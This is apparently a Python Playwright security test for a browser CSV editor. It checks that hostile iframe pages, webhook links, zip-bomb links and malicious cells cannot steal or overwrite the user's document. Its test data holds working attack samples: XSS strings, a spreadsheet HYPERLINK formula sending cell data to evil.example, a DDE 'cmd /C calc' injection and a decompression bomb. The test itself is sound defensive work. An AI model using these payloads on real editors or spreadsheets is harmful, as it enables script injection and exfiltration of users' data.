"""What a hostile page or link must not be able to do.

    php -S 127.0.0.1:8104 -t src src/php/router.php          (in the project folder)
    python tests/security_test.py

- a page around the editor (iframe) or an opener reads no document it did
  not load itself (get before load), and a load never overwrites the user's
  own document of the same name;
- ?webhook= in a link is never stored, and without ?src= it is not used
  inside a page; at the top level the user is asked;
- an AI link that would replace an existing document asks first;
- a link that unpacks to a huge text is refused;
- the CSP is also in the page itself;
- nothing in a cell ever runs as HTML (table, code, My documents, column
  panel, filter list, HTML export), and cells that a spreadsheet program
  would run as formulas (= + - @) are protected in the CSV / TSV export and
  written as text in the XLSX export."""

import base64
import os
import socket
import subprocess
import sys
import tempfile
import time
import zlib

from playwright.sync_api import sync_playwright

# The port of the test's own host page (another one when other tests use it at the same time).
HOST_PORT = os.environ.get('HOST_PORT', '8096')

EDITOR = os.environ.get('EDITOR_URL', 'http://127.0.0.1:8104/')
P = 'csveditor'
HOOK = 'csvEditor'
SECRET = 'Account,Balance\nMY SECRET TEXT,1000\n'
failures = []


def check_that(cond, what):
    """Prints one result line and notes a failure.

    Args:
        cond (bool): True when the check holds.
        what (str): what is checked.

    Returns:
        None: the result is printed and a failure is noted.
    """
    print(('ok    ' if cond else 'FAIL  ') + what)
    if not cond:
        failures.append(what)


HOST = """<!doctype html><meta charset="utf-8"><title>evil</title>
<iframe id="f" src="SRC" style="width:1200px;height:700px;border:0"></iframe>
<script>
const P = 'PFX', ORIGIN = new URL('EDITOR').origin, frame = document.getElementById('f');
window.log = [];
addEventListener('message', e => {
  if (e.source !== frame.contentWindow) return;
  log.push(e.data);
  if (e.data.type === P + ':ready') frame.contentWindow.postMessage({ type: P + ':get' }, '*');
});
window.send = m => frame.contentWindow.postMessage(m, '*');
</script>"""

with tempfile.TemporaryDirectory() as d:
    def write_host_page(name, src):
        """Writes a host page that embeds the editor into the folder of the host server.

        Args:
            name (str): the file name.
            src (str): the address of the editor's iframe.

        Returns:
            None: the file is written.
        """
        with open(os.path.join(d, name), 'w') as f:
            f.write(HOST.replace('SRC', src).replace('EDITOR', EDITOR).replace('PFX', P))
    write_host_page('get.html', EDITOR + '?embed=1')
    write_host_page('hook.html', EDITOR + '?embed=1&webhook=https://evil.example/c&auto')
    server = subprocess.Popen(['php', '-S', '127.0.0.1:' + HOST_PORT, '-t', d], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(50):
        try:
            socket.create_connection(('127.0.0.1', int(HOST_PORT)), 0.2).close()
            break
        except OSError:
            time.sleep(0.1)
    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(channel='chrome', headless=True)
            ctx = browser.new_context(viewport={'width': 1300, 'height': 800})
            errors = []
            ed = ctx.new_page()
            ed.on('pageerror', lambda e: errors.append(str(e)))
            ed.goto(EDITOR, wait_until='networkidle')
            ed.wait_for_timeout(600)
            check_that(ed.locator('meta[http-equiv="Content-Security-Policy"]').count() == 1 and "script-src 'self'" in ed.get_attribute('meta[http-equiv="Content-Security-Policy"]', 'content'), 'the CSP is also in the page')
            # The user's own document, open when the page is visited next
            ed.evaluate(f'''t => {{ const id = {HOOK}.store.create('Dossier 17', t); }}''', SECRET)
            ed.evaluate(f'''t => {HOOK}.receive(t, 'set', {{ file: 'Dossier 17' }})''', SECRET)
            ed.wait_for_timeout(300)
            if ed.locator('#ask').is_visible():
                ed.click('#ask-ok')
            ed.wait_for_timeout(300)

            # A page that never loads a document asks for "the" document
            page = ctx.new_page()
            page.on('pageerror', lambda e: errors.append(str(e)))
            page.goto('http://127.0.0.1:' + HOST_PORT + '/get.html', wait_until='load')
            page.wait_for_timeout(2500)
            saves = [m for m in page.evaluate('log') if m['type'] == P + ':save']
            check_that(saves and saves[0]['content'] is None and saves[0]['id'] is None, 'get before load answers with nothing')
            check_that('MY SECRET' not in str(page.evaluate('log')), 'no message carries the user\'s document')
            # A load with the name of the user's document does not overwrite it
            page.evaluate("send({ type: P + ':load', name: 'Dossier 17', content: 'overwritten' })")
            page.wait_for_timeout(800)
            frame = next(fr for fr in page.frames if fr.url.startswith(EDITOR))
            mine = frame.evaluate(f'''(() => {{ const f = {HOOK}.store.list().find(f => f.name === 'Dossier 17'); return {HOOK}.store.code(f.id); }})()''')
            loaded = frame.evaluate(f'''{HOOK}.store.list().filter(f => {HOOK}.store.code(f.id) === 'overwritten').map(f => f.name)''')
            check_that(mine == SECRET and len(loaded) == 1 and loaded[0] != 'Dossier 17', 'a load never overwrites the user\'s own document (it becomes a new one): ' + str(loaded))
            page.evaluate("send({ type: P + ':get' })")
            page.wait_for_timeout(300)
            check_that(page.evaluate('log[log.length - 1]')['content'] == 'overwritten', 'get then answers with the page\'s own document only')
            page.close()

            # ?webhook= inside a page without ?src=: not used, not stored
            page = ctx.new_page()
            page.goto('http://127.0.0.1:' + HOST_PORT + '/hook.html', wait_until='load')
            page.wait_for_timeout(2000)
            frame = next(fr for fr in page.frames if fr.url.startswith(EDITOR))
            check_that('evil.example' not in frame.evaluate('JSON.stringify(localStorage)'), 'a webhook in an embedded link is not stored')
            check_that('only works together with ?src=' in frame.inner_text('#toast'), 'and not used without ?src=')
            page.close()

            # ?embed=1&webhook= at the top level: the user is asked, and it is never stored
            top = ctx.new_page()
            top.goto(EDITOR + '?embed=1&webhook=https://evil.example/c&auto', wait_until='networkidle')
            top.wait_for_timeout(800)
            check_that(top.locator('#ask').is_visible() and 'evil.example' in top.inner_text('#ask'), 'a top-level link with a webhook asks first')
            top.click('#ask-ok')
            top.wait_for_timeout(200)
            check_that('evil.example' not in top.evaluate('JSON.stringify(localStorage)'), 'even when allowed, it is not stored')
            top.close()

            # An AI link names the document it changes: no question, and Undo takes the change back
            tex = 'junk,data\n1,2\n'
            ed.bring_to_front()
            ed.goto(EDITOR + '#b64=' + base64.urlsafe_b64encode(tex.encode()).decode() + '&file=Dossier%2017', wait_until='networkidle')
            ed.wait_for_timeout(800)
            check_that(not ed.locator('#ask').is_visible() and ed.evaluate(f'{HOOK}.state.name') == 'Dossier 17', 'an AI link changes the document it names without a question')
            ed.click('#btn-undo')
            ed.wait_for_timeout(400)
            mine = ed.evaluate(f'''(() => {{ const f = {HOOK}.store.list().find(f => f.name === 'Dossier 17'); return {HOOK}.store.code(f.id); }})()''')
            check_that(mine == SECRET, 'Undo brings the document back')

            # A link that unpacks to more than 5 MB
            bomb = base64.urlsafe_b64encode(zlib.compress(b'a,' * 10_000_000, 9)).decode().rstrip('=')
            ed.goto(EDITOR + '#z=' + bomb + '&file=new&name=bomb', wait_until='networkidle')
            ed.wait_for_timeout(1500)
            check_that('bomb' not in ed.evaluate(f'{HOOK}.store.list().map(f => f.name)'), 'a link that unpacks to a huge text is refused')

            # Nothing in a cell runs as HTML
            evil = 'Name,<img src=x onerror="window.pwned=1">\n"<script>window.pwned=2</script>","<svg onload=window.pwned=3>"\n=HYPERLINK("http://evil.example/?"&A1),+cmd|' + "' /C calc'!A0" + '\n@SUM(1+1),-2+3\n-5,+7\n'
            ed.goto(EDITOR + '?lang=en', wait_until='networkidle')
            ed.wait_for_timeout(500)
            ed.evaluate(f'c => {HOOK}.setCode(c)', evil)
            ed.wait_for_timeout(300)
            ed.click('[data-itab=column]')
            ed.locator('#grid .grid-row[data-r="0"] [data-c="1"]').click()
            ed.click('#btn-files')
            ed.wait_for_timeout(300)
            ed.keyboard.press('Escape')
            check_that(ed.evaluate('window.pwned') is None, 'no cell runs as script (table, code, column panel, My documents)')
            check_that(ed.locator('#grid img, #grid script, #grid svg, #hl img, #column-body img, #files-grid img, #filter-col img').count() == 0, 'no cell becomes an element')
            check_that('<img src=x' in ed.inner_text('#grid .grid-header'), 'the header shows the text as it is')
            ed.evaluate('() => { const ta = document.querySelector("#code"); ta.dispatchEvent(new Event("scroll")); }')
            ed.click('#btn-export')
            ed.select_option('#ex-format', 'html')
            html = ed.input_value('#ex-text')
            check_that('<img src=x' not in html and '&lt;img src=x onerror=&quot;window.pwned=1&quot;&gt;' in html and '&lt;script&gt;' in html, 'HTML export: cells are escaped')
            ed.select_option('#ex-format', 'csv')
            csv = ed.input_value('#ex-text')
            check_that("'=HYPERLINK" in csv and "'+cmd|" in csv and "'@SUM(1+1)" in csv and "'-2+3" in csv, 'CSV export: cells starting with = + - @ get a leading apostrophe')
            check_that('\n-5,+7\n' in csv, 'plain numbers like -5 and +7 stay as they are')
            ed.uncheck('#ex-guard')
            check_that('\n"=HYPERLINK' in ed.input_value('#ex-text') and "'=" not in ed.input_value('#ex-text'), 'the protection can be switched off')
            ed.check('#ex-guard')
            ed.select_option('#ex-format', 'tsv')
            check_that("\t'+cmd|" in ed.input_value('#ex-text'), 'TSV export: protected too')
            ed.select_option('#ex-format', 'xlsx')
            with ed.expect_download() as dl:
                ed.click('#ex-download')
            import zipfile
            with zipfile.ZipFile(dl.value.path()) as zf:
                sheet = zf.read('xl/worksheets/sheet1.xml').decode()
            check_that('<f>' not in sheet and '<f ' not in sheet and 't="inlineStr"><is><t xml:space="preserve">=HYPERLINK(' in sheet, 'XLSX export: formulas are written as text, never as a formula')
            check_that('&lt;img src=x' in sheet and '<img' not in sheet, 'XLSX export: markup is escaped')
            with zipfile.ZipFile(dl.value.path()) as zf:
                check_that(all(b'<script' not in zf.read(n) for n in zf.namelist()), 'XLSX export: nothing active in any part')
            with ed.expect_download() as dl:
                ed.click('#ex-zip')
            ed.keyboard.press('Escape')
            check_that(ed.evaluate('window.pwned') is None, 'still nothing ran')
            check_that(not errors, 'no script errors' + (': ' + '; '.join(errors) if errors else ''))
            browser.close()
    finally:
        server.terminate()

print(f'\n{len(failures)} failed' if failures else '\nall passed')
sys.exit(1 if failures else 0)
